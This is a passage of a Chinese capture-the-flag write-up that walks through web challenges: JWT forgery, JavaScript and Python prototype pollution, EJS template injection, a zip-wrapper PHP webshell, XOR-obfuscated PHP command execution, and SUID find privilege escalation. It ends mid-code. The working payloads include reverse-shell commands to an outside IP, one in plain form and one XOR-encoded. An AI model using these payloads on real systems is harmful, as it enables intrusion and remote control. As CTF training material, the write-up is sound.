<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiIsInR5</span>cCI<span class="hljs-number">6</span>IkpX<span class="hljs-attr">VCJ9</span>.eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VyIjoiZ<span class="hljs-number">3</span>Vlc<span class="hljs-number">3</span>QiLCJpYXQiOjE<span class="hljs-number">3</span>MDA<span class="hljs-number">5</span>MDgyMjl<span class="hljs-number">9.</span><span class="hljs-symbol">N6</span>H<span class="hljs-number">2</span>hwmB<span class="hljs-number">3</span>HWj<span class="hljs-number">1</span>CX<span class="hljs-number">1</span>xa<span class="hljs-symbol">NMgRWNcQZVK1</span>x<span class="hljs-number">5</span>Rj<span class="hljs-number">8</span>ad<span class="hljs-symbol">N4</span>uWEo<br></code></pre></td></tr></table></figure>

<p>我们还是要先找到密钥，查看当前页面源码，发现&#x2F;hint，进去提示我们说密钥是出题人名字，VanZY</p>
<p><a target="_blank" rel="noopener" href="https://jwt.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E9%87%8C%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9cookie%E5%86%85%E5%AE%B9%EF%BC%8C%E6%8A%8Aguess%E6%8D%A2%E4%B8%BAadmin%EF%BC%8C%E5%86%8D%E6%89%93%E5%85%A5cookie%EF%BC%8C%E5%88%B7%E6%96%B0%EF%BC%8C%E7%9C%8B%E8%A7%81%E6%BA%90%E7%A0%81%E3%80%82">https://jwt.io/在这个网站里直接修改cookie内容，把guess换为admin，再打入cookie，刷新，看见源码。</a></p>
<p>审计源码发现：**res.render(‘index’, req.body);<strong>有两个命令执行点，第一个需要让</strong>Super[‘userrole’] &#x3D;&#x3D;&#x3D; ‘Superadmin’**第二个需要绕过过滤，过滤了所有能使用的函数，所以我们需要从第一个点进入，</p>
<p>var Super &#x3D; {};定义好了，而我们需要让super变成数组，并传入**”userrole”:”Superadmin”**</p>
<p>这道题考js原型链污染</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">在/code路由里发现污染点<br><span class="hljs-title function_">putil_merge</span>(&#123;&#125;, req.<span class="hljs-property">body</span>, &#123; <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span> &#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;userrole&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Superadmin&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br>发现这样污染不行，换个payload<br></code></pre></td></tr></table></figure>

<p>每个构造函数(constructor)都有一个原型对象(prototype)</p>
<p>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></p>
<p>JavaScript使用prototype链实现继承机制</p>
<p>下面这条payload能成功污染原型链：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;userrole&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Superadmin&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>再在&#x2F;create路由里进行<strong>Ejs模板引擎注入实现RCE</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;view options&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;xxx&#x27;);&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>拿到模板，将xxx的内容修改为反弹shell命令，完整payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;view options&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.108.89.135/2333 0&gt;&amp;1\&quot;&#x27;);&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>监听2333端口，打入payload，成功拿到shell</p>
<p> SYC{Chun_a1_M4n_NeVer_G1ve_Up}</p>
<h2 id="famale-imp-l0ve"><a href="#famale-imp-l0ve" class="headerlink" title="famale_imp_l0ve"></a>famale_imp_l0ve</h2><p>打开提示说“压缩”，试着上传一个zip文件，发现上传成功，第一反映是zip伪协议读文件，就找找有无文件包含的地方，查看源码，发现&#x2F;include.php进入发现是include文件包含。</p>
<p>上传的压缩包：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">名字是：<span class="hljs-number">123</span>.zip<br>内容是：<span class="hljs-number">123</span>.jpg<br>jpg内容是：<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;123&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>在&#x2F;include.php传入</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ile=<span class="hljs-symbol">zip:</span>/<span class="hljs-regexp">/upload/</span><span class="hljs-number">123</span>.zip<span class="hljs-comment">#123.jpg</span><br></code></pre></td></tr></table></figure>

<p>然后就可以任意命令执行了</p>
<p>SYC{bobegCk7ysmNOMI8z2}</p>
<h2 id="change-it"><a href="#change-it" class="headerlink" title="change_it"></a>change_it</h2><p>经典登录，发现源码里有帐号密码，登录之后发现有文件上传，但是告诉我们只有admin才能上传文件，我们复制cookie，但是需要找到密钥，一顿好找之后发现根本找不到，就去github上找到了一个密钥爆破脚本，下载下来后爆破密钥：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4<br></code></pre></td></tr></table></figure>

<p>爆破出来密钥是：yibao</p>
<p>更换cookie后能上传文件，这道题可以直接上传php，但是我们的文件名被更换过一次，经过审计，发现是php伪随机数，随机数种子是当前时间截，我们只要掐好上传当时的时间截，把代码复制到本地跑一遍，就能拿到文件名了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">php_mt_seed</span>(<span class="hljs-params"><span class="hljs-variable">$seed</span></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br> &#125;<br> <span class="hljs-variable">$seed</span> = <span class="hljs-number">1700298188</span>;<br> <span class="hljs-title function_ invoke__">php_mt_seed</span>(<span class="hljs-variable">$seed</span>);<br> <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><br> <span class="hljs-variable">$newFileName</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br> <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$newFileName</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>) - <span class="hljs-number">1</span>)];<br> &#125;<br><br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$newFileName</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>文件名：TjjLzWMp9K.php</p>
<p>进入&#x2F;upload&#x2F;TjjLzWMp9K.php，成功命令执行。</p>
<p>SYC{fsfikgocwq4rsqmad5}</p>
<h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>发现有注册页面，随便注册一个，登录，看附件里的源码，发现&#x2F;flag网址，进去提示我们不是vip，审计源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.username=<span class="hljs-string">&quot;&quot;</span><br>        self.password=<span class="hljs-string">&quot;&quot;</span><br>        self.isvip=<span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure>

<p>user这个类里isvip默认是false，而在注册界面，发现有merge(data,user)</p>
<p>存在原型链污染，根据python的结构，我们在注册时post的json数据应该是这样的：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;q&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;q&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;__class__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <br>        <span class="hljs-attr">&quot;__base__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;isvip&quot;</span> <span class="hljs-punctuation">:</span><span class="hljs-string">&quot; True&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>但是显示被过滤了，经过测试，发现过滤了isvip，那么尝试unicode编码绕过：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;q&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;q&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;__class__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <br>        <span class="hljs-attr">&quot;__base__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;\u0069\u0073\u0076\u0069\u0070&quot;</span> <span class="hljs-punctuation">:</span><span class="hljs-string">&quot; True&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>注册成功！然后登录进去，进入&#x2F;flag界面，提示我们传入一个num：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">and</span> data != <span class="hljs-string">&quot;123456789&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(data) == <span class="hljs-number">123456789</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(data) &lt;=<span class="hljs-number">10</span>:<br></code></pre></td></tr></table></figure>

<p>传入的num满足以上条件，即可拿到flag，尝试在123456789前后加各种字符，发现均不行，最后发现空格和tab能成功进入，于是传入num&#x3D;%20123456789或者num&#x3D;%09123456789均可。</p>
<p>SYC{WaefaxJoYLKnVyQQhO}</p>
<h2 id="EzRce"><a href="#EzRce" class="headerlink" title="EzRce"></a>EzRce</h2><p>绕过waf.php命令执行，经过测试，发现只能用异或payload，先看看phpinfo：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?data<span class="hljs-operator">=</span>(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%99</span><span class="hljs-variable">%90</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>发现ban了绝大多数命令执行函数：</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,<span class="hljs-keyword">fwrite</span>,passthru,<span class="hljs-keyword">popen</span>,shell_exec,error_log,fputs,file_get_contents,assert,call_user_func,call_user_func_array,array_map,array_filter,array_reduce,get_defined_vars,getallheaders<br></code></pre></td></tr></table></figure>

<p>但还剩一个proc_open。</p>
<p>根据php手册的内容：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>  <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;ipconfig&quot;</span>;  <br><span class="hljs-variable">$array</span> =   <span class="hljs-keyword">array</span>(  <br>  <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>),   <span class="hljs-comment">//标准输入 </span><br>  <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),   <span class="hljs-comment">//标准输出内容 </span><br>  <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)    <span class="hljs-comment">//标准输出错误 </span><br>);  <br><br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$test</span>,<span class="hljs-variable">$array</span>,<span class="hljs-variable">$pipes</span>);   <span class="hljs-comment">//打开一个进程通道 </span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">stream_get_contents</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);    <span class="hljs-comment">//为什么是$pipes[1]，因为1是输出内容 stream_get_contents — 读取资源流到一个字符串</span><br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$fp</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>我们需要构造的payload为</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proc_open</span>(<span class="hljs-string">&quot;bash -c &quot;</span>bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">47.108.89.135</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><span class="hljs-string">&quot;&quot;</span>,$array,$pipes);<br><span class="hljs-attribute">print_r</span>(stream_get_contents($pipes[<span class="hljs-number">1</span>]));<br></code></pre></td></tr></table></figure>

<p>经过变量替换：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?d</span>ata=<span class="hljs-variable">$a</span>[]=<span class="hljs-string">&quot;pipe&quot;</span>;<span class="hljs-variable">$a</span>[]=<span class="hljs-string">&quot;r&quot;</span>;<span class="hljs-variable">$aa</span>[]=<span class="hljs-string">&quot;pipe&quot;</span>;<span class="hljs-variable">$aa</span>[]=<span class="hljs-string">&quot;w&quot;</span>;<span class="hljs-variable">$aaa</span>[]=<span class="hljs-variable">$a</span>;<span class="hljs-variable">$aaa</span>[]=<span class="hljs-variable">$aa</span>;<span class="hljs-variable">$aaa</span>[]=<span class="hljs-variable">$aa</span>;<span class="hljs-variable">$_</span>=<span class="hljs-string">&quot;bash -c &quot;</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/tcp</span><span class="hljs-regexp">/47.108.89.135/</span><span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$__</span>=proc_open(<span class="hljs-variable">$_</span>,<span class="hljs-variable">$aaa</span>,<span class="hljs-variable">$___</span>);print_r(stream_get_contents(<span class="hljs-variable">$___</span>[<span class="hljs-number">1</span>]));<br></code></pre></td></tr></table></figure>

<p>经过异或操作：</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?data=$a[]=(%8f%96%8f%9a^%ff%ff%ff%ff);$a[]=(%8d^%ff);$aa[]=(%8f%96%8f%9a^%ff%ff%ff%ff);$aa[]=(%88^%ff);$aaa[]=$a;$aaa[]=$aa;$aaa[]=$aa;$_=(%9d%9e%8c%97%df%d2%9c%df%dd%9d%9e%8c%97%df%d2%96%df%c1%d9%df%d0%9b%9a%89%d0%8b%9c%8f%d0%cb%c8%d1%ce%cf%c7%d1%c7%c6%d1%ce%cc%ca%d0%cd%cc%cc%cc%df%cf%c1%d9%ce%dd^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff);$__=(%8f%8d%90%9c%a0%90%8f%9a%91^%ff%ff%ff%ff%ff%ff%ff%ff%ff)($_,$aaa,$___);(%8f%8d%96%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff)((%8c%8b%8d%9a%9e%92%a0%98%9a%8b%a0%9c%90%91%8b%9a%91%8b%8c^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff)($___[(%ce^%ff)]));<br></code></pre></td></tr></table></figure>

<p>我们打入payload进行反弹shell，但是当我们cat &#x2F;flag 的时候提示我们Permission denied没有权限，就要进行提权。<a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/80428173">https://blog.csdn.net/Fly_hps/article/details/80428173</a></p>
<p>利用命令查找系统上运行的所有SUID可执行文件。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>

<p>回显</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/bin/mount<br><span class="hljs-regexp">/bin/su</span><br><span class="hljs-regexp">/bin/umount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chfn</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/chsh</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/find</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/gpasswd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/newgrp</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/passwd</span><br></code></pre></td></tr></table></figure>

<p>我们进行find提权：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag \;<br></code></pre></td></tr></table></figure>

<p>拿到flag</p>
<p>SYC{ThE_RCe is S0 Eas1ly_DD!}</p>
<h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><p>又臭又长的反序列化。</p>
<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>刚开始就来了个下马威：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$user</span>)) &#123;<br></code></pre></td></tr></table></figure>

<p>不能以Oa开头，假如不ban掉a的话，我们可以在a数组里面放上我们的恶意对象，也可以反序列化，但是ArrayObject，（此方法只在php版本8.0以下适用）他是C开头的，并且可以绕过O，然后还可以带属性反序列化，符合条件，因此可以构造payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>

<p>整段代码可以分为两部分，第一部分是做题部分，但是需要密钥，第二部分是拿取密钥部分，这里有很多小知识点。</p>
<p>在useless类中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;QW))&lt;<span class="hljs-number">80</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;YXX)&lt;<span class="hljs-number">80</span>)&#123;<br>                <span class="hljs-variable">$bool</span>=!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;QW)&amp;&amp;!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;YXX)&amp;&amp;(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;QW) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;YXX)) &amp;&amp; (<span class="hljs-variable language_">$this</span>-&gt;QW != <span class="hljs-variable language_">$this</span>-&gt;YXX) <span class="hljs-keyword">and</span> <span class="hljs-variable">$random</span>===<span class="hljs-string">&#x27;newbee&#x27;</span>;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$bool</span>)&#123;<br></code></pre></td></tr></table></figure>

<p>我们需要传入QW和YXX的值，让他俩值不相等，但是MD5加密相等，这种MD5加密强比较，第一反应应该是数组绕过，但是这里把数组ban了，第二反应是碰撞，但是找遍全网也找不到80个字符以下的两个md5相等的字符串，查询资料，发现还有第三种方法：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-literal">NAN</span>代表非数值的特殊值，用于指示某个值不是数字<br><span class="hljs-literal">NAN</span>与其他数值进行比较的结果总是不相等的，包括自身在内<br></code></pre></td></tr></table></figure>

<p>所以将QW和YXX均赋值为NAN即可绕过。</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">关于这个的问题and <span class="hljs-symbol">$ra</span>ndom===<span class="hljs-string">&#x27;newbee&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>这里是一个随机数字，但是要等于一个字符串，显然不可能，其实这里不用管，因为赋值符号‘&#x3D;’的优先级大于and，所以他会被忽略。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/key\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>	<span class="hljs-variable">$a</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]: <span class="hljs-string">&quot;&quot;</span> ;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/HTTP/i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$a</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ 